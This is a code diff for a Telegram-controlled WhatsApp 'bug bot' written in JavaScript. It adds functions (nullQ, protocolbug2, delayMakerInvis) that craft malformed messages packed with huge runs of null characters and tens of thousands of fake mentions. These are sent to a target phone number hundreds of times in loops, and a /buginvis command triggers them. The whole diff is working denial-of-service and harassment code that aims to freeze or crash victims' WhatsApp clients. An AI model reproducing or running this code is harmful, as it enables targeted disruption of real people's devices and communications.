@@ -309,6 +309,51 @@ async function VampireSpamNotif(target, Ptcp = true) {
         }
     }, { participant: { jid: target } }, { messageId: null });
 }
+async function nullQ(target) {
+  let mentioned = Array.from({ length: 100000 }, () =>
+    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+  );
+
+  await sock.relayMessage(target, {
+    listResponseMessage: {
+      title: "@tamainfinity",
+      listType: 2,
+      buttonText: null,
+      sections: null,
+      singleSelectReply: { selectedRowId: "X" },
+      contextInfo: {
+        mentionedJid: mentioned,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "status@broadcast",
+        mentionedJid: ["13135550002@s.whatsapp.net"],
+        quotedMessage: {
+          interactiveResponseMessage: {
+            body: {
+              text: "@tamainfinity",
+              format: 1
+            },
+            nativeFlowResponseMessage: {
+              name: "menu_options",
+              paramsJson: "\u0000".repeat(999999),
+              version: 3
+            },
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 9741
+            }
+          }
+        },
+        disappearingMode: {
+          initiator: "CHANGED_IN_CHAT",
+          trigger: "CHAT_SETTING"
+        }
+      }
+    },
+    description: "X"
+  }, {
+    participant: { jid: target }
+  });
+}
 async function VampireGroupInvis(target, ptcp = true) {
     try {
         const message = {
@@ -529,6 +574,89 @@ async function VampireNewUi(target, Ptcp = true) {
         console.log(err);
       }
     }
+    async function protocolbug2(target, mention) {
+    const generateMessage = {
+        viewOnceMessage: {
+            message: {
+                imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    caption: "⎋ 𝐅𝐢𝐍𝐈𝐗͜͢-‣",
+                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+                    fileLength: "19769",
+                    height: 354,
+                    width: 783,
+                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+                    mediaKeyTimestamp: "1743225419",
+                    jpegThumbnail: null,
+                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
+                    scanLengths: [2437, 17332],
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                        isSampled: true,
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 9741,
+                        isForwarded: true
+                    }
+                }
+            }
+        }
+    };
+
+    const msg = generateWAMessageFromContent(target, generateMessage, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    if (mention) {
+        await sock.relayMessage(
+            target,
+            {
+                statusMentionMessage: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
+                }
+            },
+            {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
+                        content: undefined
+                    }
+                ]
+            }
+        );
+    }
+}
 async function VampireBlankIphone(target) {
     try {
         const messsage = {
@@ -1051,7 +1179,63 @@ async function delayByGizz(target) {
     }
   });
 }
-
+async function delayMakerInvis(target) {
+  return sock.relayMessage(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 1,
+              forwardedNewsletterMessageInfo: {
+                            newsletterJid: "333333333333@newsletter",
+                            serverMessageId: 1,
+                            newsletterName: "-"
+              },
+              remoteJid: "status@broadcast",
+              participant: target,
+              quotedMessage: {
+                interactiveResponseMessage: {
+                  body: {
+                    format: 1,
+                    text: `RANZ COLD`,
+                  },
+                  nativeFlowResponseMessage: {
+                    name: "galaxy_message",
+                    paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(
+                      510000,
+                    )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
+                      510000,
+                    )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
+                    version: 3,
+                  },
+                },
+              },
+            },
+            body: {
+              text: "*⺞ 𝙒𝙃𝙀𝙍𝙀 𝙄𝙎 𝙎𝙄𝘽𝘼𝙔?*",
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "galaxy_message",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonsParamsJson: "",
+                },
+              ],
+            },
+          },
+        },
+      },
+    },
+    { participant: { jid: target } },
+  );
+}
 async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
     const delaymention = Array.from({ length: 30000 }, (_, r) => ({
         title: "᭡꧈".repeat(95000),
@@ -1167,13 +1351,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 100; i++) {
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
+    for (let i = 0; i <= 800; i++) {
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
@@ -1308,7 +1486,7 @@ Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
 ╭━━━━━━━━━━━━━━━━━
 │ 語  /superdelay
 │ 語  /bakios
-│ 語  /system
+│ 語  /buginvis
 │
 ╰━━━━━━━━━━━━━━━━━━
 
@@ -1546,7 +1724,41 @@ bot.onText(/\/superdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 1200; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
     }
 
@@ -1652,7 +1864,7 @@ bot.onText(/\/bakios(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/delay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/buginvis(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1682,57 +1894,8 @@ bot.onText(/\/delay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
-        await delayByGizz(formatedNumber);
+    for (let i = 0; i < 800; i++) { // Kirim 3 kali langsung
+        await protocolbug2(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -2100,7 +2263,7 @@ bot.on("callback_query", async (callbackQuery) => {
 ╭━━━━━━━━━━━━━━━━━
 │ 語  /superdelay
 │ 語  /bakios
-│ 語  /system
+│ 語  /buginvis
 │
 ╰━━━━━━━━━━━━━━━━━━
 
